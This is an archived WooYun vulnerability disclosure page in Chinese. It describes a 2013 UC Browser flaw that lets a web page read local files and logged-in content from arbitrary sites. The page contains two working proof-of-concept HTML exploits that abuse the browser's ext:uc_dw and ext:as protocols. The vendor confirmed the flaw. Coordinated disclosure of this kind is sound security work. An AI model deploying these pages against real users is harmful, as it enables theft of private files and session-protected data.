@@ -1,0 +1,236 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		UC浏览器窃取本地文件和任意http域内容  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		UC浏览器窃取本地文件和任意http域内容  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/爱梅小礼">爱梅小礼</a> 
+</li><li>提交时间：		2013-12-23 10:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-26：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-12：	细节向普通白帽子公开<br/>
+									2014-02-01：	细节向实习白帽子公开<br/>
+									2014-03-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">这次带来了两个弱点，一个是跨本地域，另一个是本地域可以执行的new payload。<br />
+<br />
+（感谢wooyun和厂商给的price，本想留着些漏洞等过年以后再提交呢，为了表达谢意，我也不能老是留着）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试版本：9.4.2.365<br />
+<br />
+本次问题是ext:as协议引起的http-&gt;file的跨域：<br />
+<br />
+</p><pre><code>&lt;iframe src=ext:as:navi_online_index-479*1248-U90888:file:///mnt/sdcard/payload.html&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+它能做什么完全取决于file域的权限了，例如可以窃取本地文件。可参考  <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-045390">WooYun: UC浏览器跨本地域漏洞可获取本地文件内容</a>  中的exp和payload代码，经测试也是可以的，几乎可以复制，此处不再赘述。<br />
+<br />
+<br />
+<br />
+而今天我要发的payload是file-&gt;http跨域弱点，自从  <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-023920">WooYun: UC浏览器跨本地域XSS可盗取任意域Cookie</a>  之后，UC修补了这个弱点，file域再也无法获取到http域的任何内容（document.getElementById.contentDocument不再能获取到远程iframe的句柄），但这种限制可以间接绕过：UC内置协议ext:uc_dw可以无提示地下载任意类型的文件，而且request是带着相应cookie的，并保存在固定目录，下载文件名也是可预测的。所以思路就是使用ext:uc_dw把想要读取的内容下载到本地，然后再读取本地文件（file域读取file域没有限制）。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http协议远程访问exp.html 先将payload.html下载到本地，五秒钟等待下载完毕 再用ext:as跨域去执行它。<br />
+<br />
+exp.html内容：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;iframe src=ext:uc_dw:http://127.0.0.1:8888/payload.html&gt;&lt;/iframe&gt;<br />
+&lt;/body&gt;<br />
+&lt;script&gt;<br />
+setTimeout(&quot;document.body.innerHTML=&#039;&lt;iframe src=ext:as:navi_online_index-479*1248-U90888:file:///mnt/sdcard/payload.html&gt;&lt;/iframe&gt;&#039;&quot;,5000);<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+假设http://m.baidu.com/是用户只有登录过才能看到的持有cookie的私有页面，为保证这一点，我用自己的id登录了百度（右上角的id）：<br />
+<br />
+</p><p class="detail"><a href="../images/2221270230c87fdb6ddba10f886dfd28b259e410.png" target="_blank"><img src="../images/2221270230c87fdb6ddba10f886dfd28b259e410.png" alt="QQ截图20131222203154.png" width="600"/></a></p><p class="detail"><br />
+<br />
+payload.html是exp.html下载到本地执行的，它先下载http://m.baidu.com/内容并自动保存到/mnt/sdcard/UCDownloads/index.html，然后再读取它：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;iframe src=ext:uc_dw:http://m.baidu.com/&gt;&lt;/iframe&gt;<br />
+&lt;/body&gt;<br />
+<br />
+&lt;script&gt;<br />
+<br />
+<br />
+function inject(){<br />
+<br />
+var d = document.getElementById(&quot;hi&quot;).contentDocument || document.getElementById(&quot;hi&quot;).contentWindow.document<br />
+<br />
+alert(d.body.innerHTML);<br />
+<br />
+}<br />
+setTimeout(&quot;document.body.innerHTML=&#039;&lt;iframe id=hi src=file:///mnt/sdcard/UCDownloads/index.html onload=inject()&gt;&lt;/iframe&gt;&#039;&quot;,5000);<br />
+<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+执行效果如下：<br />
+<br />
+exp.html会先下载payload.html<br />
+<br />
+</p><p class="detail"><a href="../images/22212928d0e5dffa8bb57819bb20f5d5feda9ff3.png" target="_blank"><img src="../images/22212928d0e5dffa8bb57819bb20f5d5feda9ff3.png" alt="QQ截图20131222203431.png" width="600"/></a></p><p class="detail"><br />
+<br />
+五秒后payload.html会再下载http://m.baidu.com/内容并命名为index.html文件：<br />
+<br />
+</p><p class="detail"><a href="../images/22213453c3bcde6543ce36e1f8849701af58e5fb.png" target="_blank"><img src="../images/22213453c3bcde6543ce36e1f8849701af58e5fb.png" alt="QQ截图20131222203633.png" width="600"/></a></p><p class="detail"><br />
+<br />
+payload.html读取index.html，从页面中的ID来看，确实是用户登录后的私有页面，而不是人人都能看到的前台页面：<br />
+<br />
+</p><p class="detail"><a href="../images/2221381793abbf37223f04e347d369922646d909.png" target="_blank"><img src="../images/2221381793abbf37223f04e347d369922646d909.png" alt="QQ截图20131222202652.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+证明完毕，才发现我书面表达能力太差了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">哥，你懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/爱梅小礼" title="爱梅小礼">爱梅小礼</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046757" title="UC浏览器窃取本地文件和任意http域内容">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-23 11:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">经验证，漏洞存在，非常感谢爱梅小礼提供的漏洞信息！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46757";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
